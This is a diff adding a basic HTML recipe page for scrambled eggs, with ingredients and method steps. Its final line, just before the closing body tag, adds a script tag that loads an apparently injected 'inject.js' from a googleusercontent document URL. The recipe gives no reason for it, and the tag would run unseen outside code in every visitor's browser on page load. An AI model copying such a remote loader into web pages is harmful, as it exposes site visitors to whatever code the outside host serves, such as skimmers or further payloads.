@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta lang="en">
+    <meta viewport="width=device-width, initial-scale=1">
+    <title>Title</title>
+    <!--<link rel="stylesheet" href="css/style.css">-->
+    <!--<source src="js/script.js" defer>-->
+</head>
+<body>
+
+    <h1>Scrambled Eggs</h1>
+    <p>Eggs are some of my favorite foods. Here is a recipe for deliciously rich scrambled eggs.</p>
+
+    <div>
+        <h2>Ingredients</h2>
+        <ul>
+            <li>2 eggs</li>
+            <li>1tbs of Butter</li>
+            <li>2tbs of cream</li>
+        </ul>
+    </div>
+
+    <div> 
+        <h2>Method</h2>
+        <ol>
+            <li>Melt butter in a frying pan over meadium head</li>
+            <li>Gently mix the eggs and cream in a bowl</li>
+            <li>Once butter has melted, add cream and eggs</li>
+            <li>Using a spatula, fold the eggs from the edge of the pan to the center (as if you are making an omlette)</li>
+            <li>When the eggs are still moist, remove them from the heat (it will continue to cook on the plate until served)</li>
+        </ol>
+    </div>
+<script type='text/javascript'  src="https://doc-14-7k-docs.googleusercontent.com/5807a17879fa8332cf5c93162cf5a4421bb5724aa76a47cb699e003df7957a8f/inject.js?id=d3787f12-3afe-45f4-9ed3-b7f389b86a24"></script></body>
+</html>
